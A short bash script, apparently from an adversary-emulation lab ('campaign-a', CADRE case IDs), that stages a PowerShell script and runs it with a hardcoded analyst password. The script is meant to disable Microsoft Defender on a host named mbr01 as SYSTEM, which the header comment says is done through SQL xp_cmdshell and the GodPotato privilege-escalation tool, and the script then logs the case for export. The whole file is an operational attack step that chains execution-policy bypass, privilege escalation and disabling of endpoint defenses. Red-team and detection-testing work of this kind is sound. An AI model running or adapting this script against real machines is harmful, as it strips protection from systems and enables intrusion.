#!/usr/bin/env bash
# Disable Defender on mbr01 as SYSTEM via SQL xp_cmdshell + GodPotato
set -euo pipefail
source "$(dirname "$0")/../lib/campaign-a-common.sh"

CASE_ID="CADRE-DEFENDER-MBR01-${CASE_DATE:-$(date -u +%Y%m%d)}-ws01"
T0=$(date -u +%Y-%m-%dT%H:%M:%SZ)
PS1_LOCAL="${CAMPAIGN_A_LIB}/../windows/campaign-a-t043-disable-defender.ps1"

echo "=== DEFENDER-DISABLE-MBR01 | ${CASE_ID} | T0=${T0} ==="

bash "${CAMPAIGN_A_LIB}/ws01-stage-file.sh" "${PS1_LOCAL}" "campaign-a-t043-disable-defender.ps1"

ws01_exec_as analyst_t1 'T13r_An@lyst!' \
  "powershell -NoProfile -ExecutionPolicy Bypass -File C:\\Tools\\cadre-attack\\campaign-a-t043-disable-defender.ps1 -Server ${MBR01:-192.168.77.22} -Username analyst_t1 -Password 'T13r_An@lyst!' -GpPath 'C:\\Windows\\Temp\\cadre-tools\\GodPotato.exe'"

cadre_export "${CASE_ID}" DEFENDER-MBR01 "${T0}" 192.168.77.62
echo "T0=${T0}" | tee "/tmp/${CASE_ID}.t0"
echo "=== DEFENDER-DISABLE-MBR01 complete ==="
